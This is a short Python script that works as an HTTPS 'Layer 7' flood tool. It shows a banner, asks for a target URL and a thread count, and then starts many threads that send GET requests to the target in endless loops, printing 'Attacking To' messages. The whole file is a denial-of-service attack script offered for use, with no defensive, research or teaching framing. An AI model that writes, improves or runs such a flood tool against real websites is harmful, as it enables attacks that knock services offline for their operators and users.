import http.client
import os
import time
import threading

def flood(url):
  headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Connection": "close"
  }
  while True:
    conn = http.client.HTTPSConnection(url, 443, timeout=1)
    conn.request("GET", "/", headers=headers)
    print(f"[Thread] Attacking To {url} Status: Unkown?")

banner = """
   __ __ ______ ______ ____     ______ __     ____   ____   ____
  / // //_  __//_  __// __ \   / ____// /    / __ \ / __ \ / __ \
 / _  /  / /    / /  / /_/ /  / /_   / /    / / / // / / // / / /
/ // /  / /    / /  / ____/  / __/  / /___ / /_/ // /_/ // /_/ /
/_//_/  /_/    /_/  /_/      /_/    /_____/ \____/ \____/ \____/
[ - ] ----------------- [ HTTPS Fl00D Layer7 ]
"""
os.system("clear")
print(banner)
time.sleep(1)
url = input("Enter URL: ")
thr = int(input("Thread: "))
time.sleep(3)
os.system("clear")

for i in range(thr):
  t = threading.Thread(target=flood,args=(url,), daemon=True)
  t.start()

while True:
  time.sleep(1)
